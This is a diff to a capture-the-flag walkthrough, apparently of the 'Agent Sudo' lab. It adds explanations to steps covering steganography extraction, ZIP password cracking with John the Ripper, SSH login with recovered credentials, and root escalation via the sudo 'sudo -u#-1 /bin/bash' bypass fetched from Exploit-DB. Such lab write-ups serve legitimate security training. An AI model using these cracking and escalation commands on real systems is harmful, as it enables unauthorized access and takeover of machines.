@@ -184,7 +184,10 @@ local: cutie.png remote: cutie.png
 ftp> exit
 221 Goodbye.
 ```
-19. `cat {FILE1}` to display the contents of the first file we downloaded from the target's FTP server onto our terminal, which displayed a message from one of the target's agents that's directed to one of its other agents
+
+#
+> Inspecting the Retrieved Images Using Steghide and Binwalk
+19. `cat {FILE1}.txt` to display the contents of the first file we downloaded from the target's FTP server onto our terminal, which displayed a message from one of the target's agents that's directed to one of its other agents
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ cat To_agentJ.txt
@@ -195,7 +198,7 @@ All these alien like photos are fake! Agent R stored the real picture inside you
 From,
 Agent C
 ```
-20. `steghide --info {FILE2}`
+20. `steghide --info {FILE2}.jpg` to display potentially hidden data from the JPG image that was hidden using steganopgraphy, which ended up prompting us for a passphrase, which we don't have
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ steghide --info cute-alien.jpg
@@ -206,8 +209,8 @@ Try to get information about embedded data ? (y/n) y
 Enter passphrase: 
 steghide: could not extract any data with that passphrase!
 ```
-21. `binwalk {FILE2}`
-22. `binwalk {FILE3}`
+21. `binwalk {FILE2}.jpg` to analyze the JPG image for any embedded or hidden content, which revealed nothing 
+22. `binwalk {FILE3}.png` to analyze the PNG image for any embedded or hidden content, which revealed an encrypted ZIP file embedded into the image
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ binwalk cute-alien.jpg
@@ -227,8 +230,8 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
 34820         0x8804          End of Zip archive
 ```
-23. `binwalk {FILE3} --extract`
-24. `ls`
+23. `binwalk {FILE3}.png --extract` to extract the embedded ZIP file from the JPG image
+24. `ls` to check if the contents were successfully extracted, which they were
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ binwalk cutie.png --extract
@@ -249,8 +252,11 @@ cutie-alien.jpg
 _cutie.png.extracted
 To_agentJ.txt
 ```
-25. `cd {EXTRACTED DIRECTORY}`
-26. `ls`
+
+#
+> Cracking the ZIP Archive's Password Hash Using John the Ripper
+25. `cd {EXTRACTED DIRECTORY}` to change to the extracted data from the PNG image's directory
+26. `ls` to display the available files and directories within our current working directory, which revealed a ZIP file and a text file
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ cd _cutie.png.extracted/
@@ -263,8 +269,8 @@ To_agentJ.txt
 8702.zip
 To_agentJtxt
 ```
-27. `zip2john {ZIP FILE} > {FILENAME2}.txt`
-28. `cat {FILENAME2}.txt`
+27. `zip2john {ZIP FILE} > {FILENAME2}.txt` to extract the encrypted ZIP file's password hash and redirect it to a text file
+28. `john {FILENAME2}.txt` to crack the password hash that we extracted from the ZIP file using John the Ripper's default wordlist, which ended up cracking the password
 ```bash
 ┌──(kali㉿kali)-[~/_cutie.png.extracted]
 └─$ zip2john 8702.zip > Hash.txt
@@ -285,7 +291,10 @@ alien            (8702.zip/To_agentR.txt)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
-29. `7z e 8702.Ip`
+
+#
+> Extracting the Embedded Files From the Retrieved Images
+29. `7z e 8702.zip` to extract the contents from the ZIP archive, which ended up prompting us for a password, which ended up being the password of the password hash that we just cracked using John the Ripper
 ```bash
 ┌──(kali㉿kali)-[~/_cutie.png.extracted]
 └─$ 7z e 8702.zip 
@@ -308,8 +317,8 @@ Everything is Ok
 Size:       86
 Compressed: 280
 ```
-30. `ls`
-31. `cat {FILE4}.txt`
+30. `ls` to verify if the text file was successfully extracted from the ZIP archive, which it was 
+31. `cat {FILE4}.txt` to output the contents of the text file that we just extracted onto our terminal, which ended up displaying another message from another agent containing what seems like an encoded string
 ```bash
 ┌──(kali㉿kali)-[~/_cutie.png.extracted]
 └─$ ls
@@ -325,14 +334,13 @@ We need to send the picture to 'QXJlYTUx' as soon as possible!
 By,
 Agent R
 ```
-32. `echo '{STRING}' > {FILENAME3}.txt`
-33. `hashid {FILENAME3}.txt`
-34. `base64 {FILENAME3}.txt --decode`
-35. `cd ..`
-32. `steghide --info {FILE1}`
-33. `steghide --extract -sf {FILE1}`
-34. `ls`
-35. `cat {FILE5}`
+32. `echo '{STRING}' > {FILENAME3}.txt` to write the encoded string into a text file
+33. `base64 {FILENAME3}.txt --decode` to decode the encoded string using base64, which ended up decoding it back to plaintext
+34. `cd ..` to change back to the previous directory we were in where the retrieved images are in
+35. `steghide --info {FILE2}.jpg` to display potentially hidden data from the JPG image that was hidden using steganopgraphy by using the decoded string as the passphrase to display its hidden contents
+36. `steghide --extract -sf {FILE1}` to extract the hidden data that was embedded into the JPG image using the decoded string as the passphrase, which ended up extracting a text file
+37. `ls` to verify if the text file was successfully extracted from the JPG image, which it was
+38. `cat {FILE5}` to display the extracted text file's contents onto our terminal, which contained a new set of credentials that we could use to connect to the target
 ```bash
 ┌──(kali㉿kali)-[~/_cutie.png.extracted]
 └─$ echo 'QXJlYTUx' > String.txt
@@ -372,7 +380,8 @@ Enter passphrase:
 └─$ steghide --extract -sf cute-alien.jpg 
 Enter passphrase: 
 wrote extracted data to "message.txt".
-                                                                                                                    
+```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ ls
 cute-alien.jpg
@@ -394,7 +403,7 @@ Don't ask me why the password look cheesy, ask agent R who set this password for
 Your buddy,
 chris
 ```
-36. `ssh {USER2}@{TARGET IP}`
+39. `ssh {USER2}@{TARGET IP}` to connect to the target's SSH server using the new set of credentials that we now have, which successfully logged us in
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ ssh james@10.10.75.108      
@@ -419,8 +428,8 @@ Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
 
 Last login: Tue Oct 29 14:26:27 2019
 ```
-37. `ls`
-38. `cat {FILE6}.txt`
+40. `ls` to list the available files and directories that are in our current working directory, which contained a JPG image and a user text file
+41. `cat {FILE6}.txt` to display the contents of the user text file onto our terminal, which contained the user flag for this challenge
 ```bash
 james@agent-sudo:~$ ls
 Alien_autospy.jpg  user_flag.txt
@@ -429,7 +438,7 @@ Alien_autospy.jpg  user_flag.txt
 james@agent-sudo:~$ cat user_flag.txt 
 b03d975e8c92a7c04146cfa7a5a313c7
 ```
-39. `sudo scp {FILE7}:{FILE PATH} {DESTINATION PATH}` and reverse search it
+42. `sudo scp {FILE7}:{FILE PATH} {DESTINATION PATH}` to securely copy the JPG image we found on the compromised machine onto our local attack machine, which we'll then reverse search on Google to find what incident that the JPG image is referring to
 ```bash
 ┌──(kali㉿kali)-[/]
 └─$ sudo scp james@10.10.75.108:/home/james/Alien_autospy.jpg ~/ 
@@ -447,8 +456,8 @@ Alien_autospy.jpg                                                               
 
 ![]()
 
-40. `sudo -l` to list the privileges and permissions that are granted to the current user that we're running as, which revealed that they can start an interactive instance of the Bash shell without needing the root's password
-41. `sudo -V` to displat the version information and configuration details of the **sudo** command onto our terminal
+43. `sudo -l` to list the privileges and permissions that are granted to the current user that we're running as, which revealed that they can start an interactive instance of the Bash shell without needing the root's password
+44. `sudo -V` to displat the version information and configuration details of the **sudo** command onto our terminal
 ```bash
 james@agent-sudo:~$ sudo -l
 [sudo] password for james: 
@@ -466,8 +475,8 @@ Sudoers policy plugin version 1.8.21p2
 Sudoers file grammar version 46
 Sudoers I/O plugin version 1.8.21p2
 ```
-42. `searchsploit sudo 1.8.2` to search for exploits related to version 1.8.2 of the sudo program
-43. `curl "https://www.exploit-db.com/raw/{EXPLOIT FILE}"`
+45. `searchsploit sudo 1.8.2` to search for exploits related to version 1.8.2 of the sudo program, which displayed six exploit modules but the one that seems the most relevant to our situation is the last one, which is the one we'll be using
+46. `curl "https://www.exploit-db.com/raw/{EXPLOIT FILE}"` to retrieving and display the content of the exploit's Python script from the Exploit-DB onto our terminal, which revealed a code sequence that could use to elevate our privileges within the target's compromised system
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ searchsploit --verbose sudo 1.8.2
@@ -568,8 +577,8 @@ print("Lets hope it works")
 
 os.system("sudo -u#-1 "+ binary)
 ```
-44. `sudo -u#-1 /bin/bash`
-45. `whoami` to verify if we're running as root, which we are
+47. `sudo -u#-1 /bin/bash` to run a Bash shell with the user ID -1
+48. `whoami` to verify if we're running as root, which we are
 ```bash
 james@agent-sudo:~$ sudo -u#-1 /bin/bash
 root@agent-sudo:~#
@@ -578,8 +587,8 @@ root@agent-sudo:~#
 root@agent-sudo:~# whoami
 root
 ```
-46. `find / -type f -name "root*" 2>/dev/null`
-47. `cat {ROOT FILE PATH}` to display the contents of the root text file onto our terminal, which ended up containing the root flag for this challenge
+49. `find / -type f -name "root*" 2>/dev/null` to search for any file within the entire file system ("/") starting with "root" and display the path for any matching files while suppressing any error messages that may occur to the /dev/null file during the search
+50. `cat {ROOT FILE PATH}` to display the contents of the root text file onto our terminal, which ended up containing the root flag for this challenge
 ```bash
 root@agent-sudo:~# find / -type f -name "root*" 2>/dev/null
 /lib/recovery-mode/options/root
